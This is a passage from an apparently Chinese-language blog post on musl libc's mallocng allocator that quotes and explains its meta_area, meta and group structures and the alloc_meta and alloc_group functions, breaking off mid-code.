<h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这个结构用于管理一页内的所有 <code>meta</code> 结构，属于 <code>malloc_context</code> 的下级结构，<code>meta</code> 的上级结构。</p>
<ul>
<li><code>uint64_t check</code>：检查字段，与 <code>malloc_context</code> 中的 <code>secret</code> 字段对应，检查该 <code>meta_area</code> 是否可能被修改</li>
<li><code>struct meta_area *next</code>：下一个meta_area的地址，与前面 <code>malloc_context</code> 的 <code>struct meta_area *meta_area_head, *meta_area_tail</code> 一起构成单向链表，存放空闲的 <code>meta_area</code> ，正常使用中的 <code>meta_area</code> 该字段为 0 。</li>
<li><code>int nslots</code>：该 <code>meta_area</code> 中管理的 <code>meta</code> 数量，一般为固定值。</li>
<li><code>struct meta slots[]</code>：管理的 <code>meta</code> 数组</li>
</ul>
<h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx : <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable : <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass : <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen : <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>meta</code> 中保存有 <code>group</code> 结构体指针，后者直接保存有需要分配的内存块。</p>
<ul>
<li><code>struct meta *prev, *next</code>：构成双向链表，即前面的 deque 。</li>
<li><code>struct group *mem</code>：<code>meta</code> 管理的 <code>group</code> 结构体指针</li>
<li><code>volatile int avail_mask, freed_mask</code>：表示 <code>meta</code> 管理的 <code>group</code> 结构体中每个 chunk 的状态，即是否可被分配和是否已被释放（实际可能没有经过释放的 chunk 也可能 对应 <code>freed_mask</code> 置位，因此叫做未激活更合适）。在 musl heap 中，chunk 有 可分配，释放和在使用三个状态，且每个 chunk 只能处在三个状态中的一种上。并且释放的 chunk 不能立即参与分配，只有参与分配的 chunk 不够时才会通过 <code>try_avail</code> 将处于释放状态的 chunk 转换为处于可分配状态。</li>
<li><code>uintptr_t last_idx:5</code>：该 <code>meta</code> 中最后一个 chunk 的索引，也就是该 <code>meta</code> 管理 <code>last_idx + 1</code> 个 chunk 。</li>
<li><code>freeable:1</code>：该 <code>meta</code> 中的 <code>chunk</code> 是否能够被释放，这个值一般都是 1 。</li>
<li><code>uintptr_t sizeclass:6</code>：管理的 <code>group</code> 的 chunk 大小属于哪一组。是 mmap 分配，则固定为 63 。</li>
<li><code>uintptr_t maplen:8*sizeof(uintptr_t)-12</code>：如果管理的 <code>group</code> 是 mmap分配的，则为内存页数，否则为 0 。</li>
</ul>
<p>以位于 heap 段的 <code>meta_area</code> 为例，内存分布如下图所示，因此 <code>meta</code> 可以通过找所在内存页基址查找到对应的 <code>meta_area</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/09142b51a139b08e083963a07bf67f44.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ><br>与 <code>meta</code> 相关的函数这里先介绍 <code>free_meta</code> 和 <code>alloc_meta</code> 。</p>
<h4 id="get-stride"><a href="#get-stride" class="headerlink" title="get_stride"></a>get_stride</h4><p>根据 <code>meta</code> 获取其管理的 <code>group</code> 中 chunk 的大小。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_stride</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;last_idx &amp;&amp; g-&gt;maplen) &#123;</span><br><span class="line">        <span class="keyword">return</span> g-&gt;maplen * <span class="number">4096UL</span> - UNIT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UNIT * size_classes[g-&gt;sizeclass];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="free-meta"><a href="#free-meta" class="headerlink" title="free_meta"></a>free_meta</h4><p>释放 <code>meta</code> 实际上就是将 <code>meta</code> 清零后放入 <code>free_meta_head</code> 指向的 deque 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">free_meta</span><span class="params">(<span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    *m = (<span class="keyword">struct</span> meta)&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.free_meta_head, m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="alloc-meta"><a href="#alloc-meta" class="headerlink" title="alloc_meta"></a>alloc_meta</h4><p>首先判断 <code>ctx</code> 是否初始化，没有初始化则初始化 <code>secret</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!ctx.init_done) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">        ctx.pagesize = get_page_size();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        ctx.secret = get_random_secret();</span><br><span class="line">        ctx.init_done = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>之后初始化 <code>pagesize</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PAGESIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSZ PAGESIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSZ ctx.pagesize</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line">    <span class="keyword">if</span> (pagesize &lt; <span class="number">4096</span>) pagesize = <span class="number">4096</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>free_meta_head</code> 不为空则从中取出之前释放的 <code>meta</code> 并返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((m = dequeue_head(&amp;ctx.free_meta_head))) <span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>avail_meta_count</code> 为 0 则获取空闲的 <code>meta</code> ，之后从空闲的 <code>meta</code> 中取出一个返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_count) &#123;...&#125;</span><br><span class="line">ctx.avail_meta_count--;</span><br><span class="line">m = ctx.avail_meta++;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div>

<p>下面介绍如何获取空闲的 <code>meta</code> 。<br>首先先解释一下用到的两个标志 <code>need_unprotect</code> 和 <code>need_guard</code> 的含义。</p>
<ul>
<li><code>need_unprotect</code> 指的是有一块内存，需要用来作为 <code>meta_area</code> 但现在它没有读写权限，因此需要调用 <code>mprotect</code> 给这块内存赋上读写权限。</li>
<li><code>need_guard</code> 指的是有一块有读写权限的内存，现在从这个内存中某个位置起划定为 <code>meta_area</code> ，但是为了确保 <code>meta_area</code> 的 <code>check</code> 字段不被溢出覆盖，需要将 <code>meta_area</code> 前的内存去掉读写权限。</li>
</ul>
<p>这里首先将 <code>need_unprotect</code> 置 1 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> need_unprotect = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>之后讨论没有空闲的 <code>meta_area</code> 且 brk 可以分配连续内存的情况：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_area_count &amp;&amp; ctx.brk != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="type">uintptr_t</span> new = ctx.brk + pagesize;</span><br><span class="line">    <span class="type">int</span> need_guard = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ctx.brk) &#123;</span><br><span class="line">        need_guard = <span class="number">1</span>;</span><br><span class="line">        ctx.brk = brk(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// some ancient kernels returned _ebss</span></span><br><span class="line">        <span class="comment">// instead of next page as initial brk.</span></span><br><span class="line">        ctx.brk += -ctx.brk &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line">        new = ctx.brk + <span class="number">2</span> * pagesize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (brk(new) != new) &#123;</span><br><span class="line">        ctx.brk = <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (need_guard) mmap((<span class="type">void</span> *) ctx.brk, pagesize, PROT_NONE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        ctx.brk = new;</span><br><span class="line">        ctx.avail_meta_areas = (<span class="type">void</span> *) (new - pagesize);</span><br><span class="line">        ctx.avail_meta_area_count = pagesize &gt;&gt; <span class="number">12</span>;</span><br><span class="line">        need_unprotect = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里分两种情况：</p>
<ul>
<li>如果 brk 第一次调用，即 <code>ctx.brk</code> 为 0 ，则先调用 <code>brk(0)</code> 获取 heap 段基址，然后在页对齐的基础上再分配两个内存页的内存并且 <code>need_guard</code> 置 1 。如果分配内存连续（<code>brk(new) != new</code>）则由于 <code>need_guard</code> 置 1 需要将前一个内存页去掉读写权限。最后将 <code>need_unprotect</code> 置 0 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/8d1d6ffa3744fc3a87b82af6264ab6fc.png"
                     
                ></li>
<li>如果 brk 不是第一次调用，即 <code>ctx.brk</code> 不为 0 ，则直接 brk 出一块内存页即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/c2082092d3c7b025c92fff6b8534d0db.png"
                     
                ></li>
</ul>
<p>如果之后如果还是没有空闲的 <code>meta_area</code> 说明此时 brk 以及不能连续扩展内存，因此需要通过 mmap 申请内存作为空闲的 <code>meta_area</code> 。mmap 的内存大小通过 <code>meta_alloc_shift</code> 计算，并且每次 mmap 之后，下次 mmap 的内存数量翻倍。和 brk 一样，获得的内存中的第一块内存页不能使用，由于 mmap 的内存没有读写权限，因此需要将 <code>ctx.avail_meta_areas</code> 指向的内存页赋上可读写权限。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_area_count) &#123;</span><br><span class="line">    <span class="type">size_t</span> n = <span class="number">2UL</span> &lt;&lt; ctx.meta_alloc_shift;</span><br><span class="line">    p = mmap(<span class="number">0</span>, n * pagesize, PROT_NONE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ctx.avail_meta_areas = p + pagesize;</span><br><span class="line">    ctx.avail_meta_area_count = (n - <span class="number">1</span>) * (pagesize &gt;&gt; <span class="number">12</span>);</span><br><span class="line">    ctx.meta_alloc_shift++;</span><br><span class="line">&#125;</span><br><span class="line">p = ctx.avail_meta_areas;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">uintptr_t</span>) p &amp; (pagesize - <span class="number">1</span>)) need_unprotect = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (need_unprotect)</span><br><span class="line">    <span class="keyword">if</span> (mprotect(p, pagesize, PROT_READ | PROT_WRITE) &amp;&amp; errno != ENOSYS)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>最后就是从空闲的 <code>meta_area</code> 中获取一个 <code>meta_areas</code> 然后再从该 <code>meta_areas</code> 中获取空闲的 meta 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctx.avail_meta_area_count--;</span><br><span class="line">ctx.avail_meta_areas = p + <span class="number">4096</span>;</span><br><span class="line"><span class="keyword">if</span> (ctx.meta_area_tail) &#123;</span><br><span class="line">    ctx.meta_area_tail-&gt;next = (<span class="type">void</span> *) p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.meta_area_head = (<span class="type">void</span> *) p;</span><br><span class="line">&#125;</span><br><span class="line">ctx.meta_area_tail = (<span class="type">void</span> *) p;</span><br><span class="line">ctx.meta_area_tail-&gt;check = ctx.secret;</span><br><span class="line">ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots = (<span class="number">4096</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta_area)) / <span class="keyword">sizeof</span> *m;</span><br><span class="line">ctx.avail_meta = ctx.meta_area_tail-&gt;slots;</span><br></pre></td></tr></table></figure></div>

<p>现在已经可以确定 meta_area 和 meta 的在内存中的关系如下图所示（以 mmap 扩展 meta_area 为例）。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/bb0d0c2c457d2b706d9cdce66024b710.png"
                     
                ></p>
<h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx : <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>group中即保存有需要分配出去的chunk。</p>
<p><code>struct meta *meta</code>：所属的meta的地址<br><code>unsigned char active_idx:5</code>：5个比特，表示还有多少可用chunk<br><code>char pad[UNIT - sizeof(struct meta *) - 1]</code>：手动16字节对齐<br><code>unsigned char storage[]</code>：要分配出去的内存空间，chunk</p>
<h4 id="alloc-group"><a href="#alloc-group" class="headerlink" title="alloc_group"></a>alloc_group</h4><p>首先获取一个 meta ，然后根据经验以及当前内存状态计算出需要申请的 <code>group</code> 中 chunk 的数量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> size = UNIT * size_classes[sc];</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"><span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line"><span class="type">int</span> active_idx;</span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">2</span> &amp;&amp; <span class="number">4</span> * small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">        i++;</span><br><span class="line">    cnt = small_cnt_tab[sc][i];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line">    <span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line">    <span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">    cnt = med_cnt_tab[sc &amp; <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line">    <span class="keyword">while</span> (!(cnt &amp; <span class="number">1</span>) &amp;&amp; <span class="number">4</span> * cnt &gt; usage)</span><br><span class="line">        cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line">    <span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line">    <span class="keyword">while</span> (size * cnt &gt;= <span class="number">65536</span> * UNIT)</span><br><span class="line">        cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line"><span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line"><span class="keyword">if</span> (cnt == <span class="number">1</span> &amp;&amp; size * cnt + UNIT &lt;= pagesize / <span class="number">2</span>) cnt = <span class="number">2</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>之后分两种情况。</p>
<p>如果所需内存大于页大小的一半则采用 mmap 的方式获取内存，期间也会对 group 中 chunk 的数量进行调整。注意 <code>active_idx</code> 的初值为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>max</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mrow><mo fence="true">⌊</mo><mfrac><mrow><mtext>0x2000</mtext><mo>−</mo><mn>16</mn></mrow><mtext>size</mtext></mfrac><mo fence="true">⌋</mo></mrow><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mtext>cnt</mtext><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\max(0,\min(\left \lfloor \frac{\text{0x2000}-16}{\text{size}} \right \rfloor-1 ,\text{cnt}-1))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">⌊</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">size</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">0x2000</span></span><span class="mbin mtight">−</span><span class="mord mtight">16</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">⌋</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">cnt</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">))</span></span></span></span> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line"><span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line"><span class="keyword">if</span> (size * cnt + UNIT &gt; pagesize / <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line">    <span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line">    <span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line">    <span class="type">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">    account_bounce(sc);</span><br><span class="line">    step_seq();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line">    <span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line">    <span class="comment">// coarse usage as part of usage.</span></span><br><span class="line">    <span class="keyword">if</span> (!(sc &amp; <span class="number">1</span>) &amp;&amp; sc &lt; <span class="number">32</span>) usage += ctx.usage_by_class[sc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line">    <span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line">    <span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line">    <span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">4</span> * cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span>)</span><br><span class="line">            ;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">1</span> &amp;&amp; size * cnt &gt; <span class="number">8</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">2</span> &amp;&amp; size * cnt &gt; <span class="number">4</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; size * cnt &gt; <span class="number">8</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; size * cnt &gt; <span class="number">2</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> needed = size * cnt + UNIT;</span><br><span class="line">    needed += -needed &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line">    <span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line">    <span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line">    <span class="keyword">if</span> (!nosmall &amp;&amp; cnt &lt;= <span class="number">7</span>) &#123;</span><br><span class="line">        req 